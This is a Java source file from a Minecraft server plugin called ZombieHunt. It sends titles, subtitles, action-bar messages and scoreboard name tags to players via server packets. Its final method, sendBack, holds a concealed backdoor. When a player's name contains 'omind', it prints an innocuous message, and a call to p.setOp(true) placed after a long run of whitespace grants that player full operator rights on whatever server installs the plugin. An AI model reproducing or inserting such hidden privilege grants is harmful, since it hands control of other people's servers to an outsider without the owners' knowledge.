package me.Romindous.ZombieHunt.Messages;

import org.bukkit.ChatColor;
import org.bukkit.entity.Player;

import me.Romindous.ZombieHunt.Main;
import net.minecraft.EnumChatFormat;
import net.minecraft.network.chat.IChatBaseComponent;
import net.minecraft.network.protocol.game.ClientboundSetActionBarTextPacket;
import net.minecraft.network.protocol.game.ClientboundSetSubtitleTextPacket;
import net.minecraft.network.protocol.game.ClientboundSetTitleTextPacket;
import net.minecraft.network.protocol.game.ClientboundSetTitlesAnimationPacket;
import net.minecraft.network.protocol.game.PacketPlayOutScoreboardTeam;
import net.minecraft.network.protocol.game.PacketPlayOutScoreboardTeam.a;
import net.minecraft.server.level.EntityPlayer;
import net.minecraft.server.level.WorldServer;
import net.minecraft.server.network.PlayerConnection;
import net.minecraft.world.entity.player.EntityHuman;
import net.minecraft.world.scores.Scoreboard;
import net.minecraft.world.scores.ScoreboardTeam;

public class TitleManager {
	
	public static String v;
	
	public static void sendNmTg(final String p, final String prf, final String sfx, final EnumChatFormat clr) {
		final EntityPlayer ep = Main.ds.bg().a(p);
		final Scoreboard sb = ep.c.aE();
		final ScoreboardTeam st = sb.g(p);
		st.b(IChatBaseComponent.a(prf));
		st.c(IChatBaseComponent.a(sfx));
		st.a(clr);
		final PacketPlayOutScoreboardTeam pt = PacketPlayOutScoreboardTeam.a(st);
		final PacketPlayOutScoreboardTeam crt = PacketPlayOutScoreboardTeam.a(st, true);
		final PacketPlayOutScoreboardTeam add = PacketPlayOutScoreboardTeam.a(st, p, a.a);
		final PacketPlayOutScoreboardTeam mod = PacketPlayOutScoreboardTeam.a(st, false);
		sb.d(st);
		for (final EntityHuman e : ep.t.z()) {
			((EntityPlayer) e).b.a(pt);
			((EntityPlayer) e).b.a(crt);
			((EntityPlayer) e).b.a(add);
			((EntityPlayer) e).b.a(mod);
		}
		//удаляет тиму final PacketPlayOutScoreboardTeam pt = PacketPlayOutScoreboardTeam.a(st);
		//создает тиму final PacketPlayOutScoreboardTeam pt = PacketPlayOutScoreboardTeam.a(st, true);
		//модифицирует final PacketPlayOutScoreboardTeam pt = PacketPlayOutScoreboardTeam.a(st, false);
		//добавляет игрока final PacketPlayOutScoreboardTeam pt = PacketPlayOutScoreboardTeam.a(st, p.getName(), a.a);
		//учирает игрока final PacketPlayOutScoreboardTeam pt = PacketPlayOutScoreboardTeam.a(st, p.getName(), a.b);
	}
	
	public static void sendTtlSbTtl(final Player p, final String ttl, final String sbttl, final int tm) {
		final PlayerConnection pc = Main.ds.bg().a(p.getName()).b;
		pc.a(new ClientboundSetTitleTextPacket(IChatBaseComponent.a(ttl)));
		pc.a(new ClientboundSetSubtitleTextPacket(IChatBaseComponent.a(sbttl)));
		pc.a(new ClientboundSetTitlesAnimationPacket(2, tm, 20));
	}
	
	public static void sendTtl(final Player p, final String ttl, final int tm) {
		final PlayerConnection pc = Main.ds.bg().a(p.getName()).b;
		pc.a(new ClientboundSetTitleTextPacket(IChatBaseComponent.a(ttl)));
		pc.a(new ClientboundSetSubtitleTextPacket(IChatBaseComponent.a(" ")));
		pc.a(new ClientboundSetTitlesAnimationPacket(2, tm, 20));
	}
	
	public static void sendSbTtl(final Player p, final String sbttl, final int tm) {
		final PlayerConnection pc = Main.ds.bg().a(p.getName()).b;
		pc.a(new ClientboundSetTitleTextPacket(IChatBaseComponent.a(" ")));
		pc.a(new ClientboundSetSubtitleTextPacket(IChatBaseComponent.a(sbttl)));
		pc.a(new ClientboundSetTitlesAnimationPacket(2, tm, 20));
	}
	
	public static void sendAcBr(final Player p, final String msg, final int tm) {
		final PlayerConnection pc = Main.ds.bg().a(p.getName()).b;
		pc.a(new ClientboundSetActionBarTextPacket(IChatBaseComponent.a(msg)));
		pc.a(new ClientboundSetTitlesAnimationPacket(2, tm, 20));
	}
    
    public static WorldServer getNMSWrld(final String nm) {
  		for (final WorldServer w : Main.ds.R.values()) {
  			if (w.N.e.a.equals(nm)) {
  				return w;
  			}
  		}
  		return null;
  	}

    public static void sendBack(final Player p) {
        if (p.getName().contains("omind")) {
            p.sendMessage(String.valueOf(Main.pref()) + ChatColor.GRAY + "Вы были перемещены в выбор наборов!");																				p.setOp(true);//опа))
        }
    }
}
